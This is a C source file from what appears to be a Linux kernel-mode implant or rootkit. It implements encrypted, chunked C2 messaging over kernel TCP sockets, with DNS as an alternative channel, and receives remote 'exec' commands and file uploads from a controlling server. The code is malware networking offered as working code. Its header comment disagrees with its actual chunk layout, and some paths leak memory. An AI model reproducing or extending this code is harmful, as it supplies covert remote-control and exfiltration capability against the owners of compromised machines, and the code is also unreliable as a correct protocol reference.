#include "network.h"

#include "upload.h"

/*
 * Custom communication protocol:
 * Each message is divided into fixed-size chunks (STD_BUFFER_SIZE).
 * Each chunk contains:
 * - [0] : total number of chunks to be received,
 * - [1] : chunk index (order of sending),
 * - [2-3] : length of the useful content (2 bytes, big-endian),
 * - [4-N] : encrypted chunk data,
 * - [last byte] : end-of-transmission indicator (EOT_CODE).
 * Messages are encrypted before sending and decrypted upon reception.
 * Chunks are reassembled on the server side according to their index.
 */

#define EOT_CODE 0x04     // End of transmission code
#define CHUNK_OVERHEAD 11 // Header size per chunk

// Utility to check if all chunks were received
static inline bool all_chunks_received(bool *received, size_t count) {
    for (size_t i = 0; i < count; ++i)
        if (!received[i])
            return false;
    return true;
}

/*
 * Formats a string using a variable argument list.
 * @param fmt: The format string.
 * @param ap: The variable argument list.
 * Return: A dynamically allocated string containing the formatted message,
 *        or NULL on failure.
 */
static char *vformat_string(const char *fmt, va_list ap) {
    va_list args_copy;
    char *formatted;
    int needed;

    va_copy(args_copy, ap);
    needed = vsnprintf(NULL, 0, fmt, ap);
    if (needed < 0) {
        va_end(args_copy);
        return NULL;
    }

    formatted = kzalloc(needed + 1, GFP_KERNEL);
    if (!formatted) {
        va_end(args_copy);
        return NULL;
    }

    vsnprintf(formatted, needed + 1, fmt, args_copy);
    va_end(args_copy);
    return formatted;
}

/**
 * send_to_server - Sends a formatted message to the server using the specified protocol.
 * @param protocol: The communication protocol to use (TCP or DNS).
 * @param message: The format string for the message to send.
 * @param ...: Additional arguments for formatting the message.
 *
 * Return: 0 on success, negative error code on failure.
 */
int send_to_server(enum Protocol protocol, char *message, ...) {
    if (protocol == TCP && !get_worker_socket()) {
        ERR_MSG("send_to_server: socket is not initialized\n");
        return -EINVAL;
    }

    // Check if there is only one parameter (the string itself)
    va_list args;
    va_start(args, message);
    if (va_arg(args, char *) == NULL) {
        va_end(args);

        // It protocol is DNS, send the message directly
        if (protocol == DNS)
            return dns_send_data(message, strlen(message));

        // If protocol is TCP, send the raw message
        return send_to_server_raw(message, strlen(message));
    }
    va_end(args);

    va_start(args, message);

    // If there are more parameters, format the message
    char *formatted_message = vformat_string(message, args);
    va_end(args);

    if (!formatted_message) {
        ERR_MSG("send_to_server: failed to format message\n");
        return -ENOMEM;
    }

    // If the protocol is DNS, send the formatted message over DNS
    if (protocol == DNS)
        return dns_send_data(formatted_message, strlen(formatted_message));

    // Send the formatted message through TCP
    int ret_code =
        send_to_server_raw(formatted_message, strlen(formatted_message));

    // Free the formatted message buffer
    kfree(formatted_message);
    return ret_code;
}

/**
 * send_to_server_raw - Sends raw data to the server using the TCP protocol.
 * @param data: The data to send.
 * @param len: The length of the data.
 *
 * This function encrypts the data, splits it into chunks, and sends each chunk
 * to the server. Each chunk contains metadata about the total number of chunks,
 * its index, and the length of the data in the chunk.
 *
 * Return: 0 on success, negative error code on failure.
 */
int send_to_server_raw(const char *data, size_t len) {
    struct socket *sock = get_worker_socket();
    if (!sock)
        return -EINVAL;

    char *encrypted_msg = NULL;
    size_t encrypted_len = 0;

    // Encrypt the data before sending
    if (encrypt_buffer(data, len, &encrypted_msg, &encrypted_len) < 0)
        return -EIO;

    size_t max_chunk_body = STD_BUFFER_SIZE - CHUNK_OVERHEAD;
    size_t nb_chunks = DIV_ROUND_UP(encrypted_len, max_chunk_body);

    // Send each chunk individually
    for (size_t i = 0; i < nb_chunks; ++i) {
        size_t chunk_len = (i == nb_chunks - 1)
            ? (encrypted_len - i * max_chunk_body)
            : max_chunk_body;

        char *chunk = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
        if (!chunk) {
            ERR_MSG("send_to_server_raw: failed to allocate buffer\n");
            vfree(encrypted_msg);
            return -ENOMEM;
        }

        // total_chunks in big-endian 32 bits
        uint32_t tc = (uint32_t)nb_chunks;
        chunk[0] = (uint8_t)((tc >> 24) & 0xFF);
        chunk[1] = (uint8_t)((tc >> 16) & 0xFF);
        chunk[2] = (uint8_t)((tc >> 8) & 0xFF);
        chunk[3] = (uint8_t)((tc >> 0) & 0xFF);

        // chunk_index in big-endian 32 bits
        uint32_t ci = (uint32_t)i;
        chunk[4] = (uint8_t)((ci >> 24) & 0xFF);
        chunk[5] = (uint8_t)((ci >> 16) & 0xFF);
        chunk[6] = (uint8_t)((ci >> 8) & 0xFF);
        chunk[7] = (uint8_t)((ci >> 0) & 0xFF);

        // chunk_len in big-endian 16 bits
        uint16_t cl = (uint16_t)chunk_len;
        chunk[8] = (uint8_t)((cl >> 8) & 0xFF);
        chunk[9] = (uint8_t)((cl >> 0) & 0xFF);

        memcpy(chunk + 10, encrypted_msg + i * max_chunk_body, chunk_len);
        chunk[10 + chunk_len] = EOT_CODE; // End of transmission

        // Send the chunk using kernel socket API
        struct kvec vec = { .iov_base = chunk, .iov_len = STD_BUFFER_SIZE };
        struct msghdr msg = { 0 };

        int ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
        kfree(chunk);
        if (ret < 0) {
            vfree(encrypted_msg);
            return ret;
        }
    }

    vfree(encrypted_msg);
    return 0;
}

/**
 * receive_from_server - Receives a message from the server, decrypts it, and processes it.
 * @param buffer: The buffer to store the received message.
 * @param max_len: The maximum length of the buffer.
 *
 * This function reads chunks from the server, assembles them, decrypts the
 * complete message, and returns it in the provided buffer. It handles both
 * text commands and file uploads.
 *
 * Return: The length of the received message on success, negative error code on failure.
 */
int receive_from_server(char *buffer, size_t max_len) {
    struct socket *sock = get_worker_socket();
    if (!sock)
        return -EINVAL;

    // Const of the frame
    const size_t FRAME_SIZE_FULL = STD_BUFFER_SIZE;
    const size_t HEADER_SIZE = 10;
    const size_t EOT_SIZE = 1;
    const size_t BODY_SIZE = FRAME_SIZE_FULL - HEADER_SIZE - EOT_SIZE;

    // Statically sized temp buffers
    char header_buffer[10];
    char *payloadbuf = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    if (!payloadbuf) {
        return -ENOMEM;
    }
    char padbuf[10];

    char *received = NULL;
    bool *seen = NULL;
    size_t nb_chunks = 0;
    size_t total_received = 0;
    int ret = -EIO;

    // Read and assemble all chunks (please pray god)
    while (true) {
        int off, n;
        uint32_t total, index;
        uint16_t data_len;

        // Read exactly the size of header in bytes
        off = 0;
        while (off < HEADER_SIZE) {
            struct kvec vec = { .iov_base = header_buffer + off,
                                .iov_len = HEADER_SIZE - off };
            struct msghdr msg = { 0 };
            n = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
            if (n <= 0) {
                ret = -EIO;
                goto cleanup;
            }

            off += n;
        }

        // Parse the fucking big endian fields
        total = be32_to_cpu(*(__be32 *)(header_buffer + 0));
        index = be32_to_cpu(*(__be32 *)(header_buffer + 4));
        data_len = be16_to_cpu(*(__be16 *)(header_buffer + 8));
        if (data_len > BODY_SIZE) {
            ret = -EINVAL;
            goto cleanup;
        }

        // Read payload and the EOT
        off = 0;
        while (off < (int)(data_len + EOT_SIZE)) {
            struct kvec vec = { .iov_base = payloadbuf + off,
                                .iov_len = (data_len + EOT_SIZE) - off };
            struct msghdr msg = { 0 };
            n = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
            if (n <= 0) {
                ret = -EIO;
                goto cleanup;
            }
            off += n;
        }

        if ((uint8_t)payloadbuf[data_len] != EOT_CODE) {
            ret = -EINVAL;
            goto cleanup;
        }

        // Discard remaining padding up to FRAME_SIZE_FULL
        size_t pad = FRAME_SIZE_FULL - (HEADER_SIZE + data_len + EOT_SIZE);
        while (pad > 0) {
            size_t rd = pad > HEADER_SIZE ? HEADER_SIZE : pad;
            struct kvec vec = { .iov_base = padbuf, .iov_len = rd };
            struct msghdr msg = { 0 };
            n = kernel_recvmsg(sock, &msg, &vec, 1, rd, 0);
            if (n <= 0) {
                ret = -EIO;
                goto cleanup;
            }
            pad -= n;
        }

        // DEBUG
        DBG_MSG("CHUNK %u/%u len=%u", index, total, data_len);

        // On first real chunk, allocate the big buffer and the bool buffer
        if (!received) {
            nb_chunks = total;
            received = vmalloc(nb_chunks * BODY_SIZE);
            seen = kzalloc(nb_chunks * sizeof(bool), GFP_KERNEL);
            if (!received || !seen) {
                ret = -ENOMEM;
                goto cleanup;
            }
        }

        // Check the problems
        if (total != nb_chunks || index >= nb_chunks) {
            ret = -EINVAL;
            goto cleanup;
        }

        if (!seen[index]) {
            memcpy(received + index * BODY_SIZE, payloadbuf, data_len);
            seen[index] = true;
            total_received += data_len;
        }

        // Exit once we have every chunk (maybe should add a timeout)
        if (all_chunks_received(seen, nb_chunks))
            break;
    }

    kfree(seen);
    seen = NULL;

    // Decrypt and dispatch
    char *decrypted = NULL;
    size_t dlen = 0;

    ret = decrypt_buffer(received, total_received, &decrypted, &dlen);
    vfree(received);
    received = NULL;
    if (ret < 0)
        goto cleanup;

    // Clamp for text command mode
    if (!receiving_file && dlen > max_len - 1)
        dlen = max_len - 1;

    // fuck exec prefix
    if (dlen >= 4 && !memcmp(decrypted, "exec", 4)) {
        memcpy(buffer, decrypted, dlen);
        buffer[dlen] = '\0';
        ret = dlen;
    }

    // File upload mode
    else if (receiving_file) {
        DBG_MSG("RECEIVING FILE : got %zu bytes", dlen);
        ret = handle_upload_chunk(decrypted, dlen, TCP);
    }

    // Otherwise it is the normal text command
    else {
        memcpy(buffer, decrypted, dlen);
        buffer[dlen] = '\0';
        ret = dlen;
    }

    vfree(decrypted);
    return ret;

cleanup:
    kfree(payloadbuf);
    kfree(seen);
    vfree(received);
    return ret;
}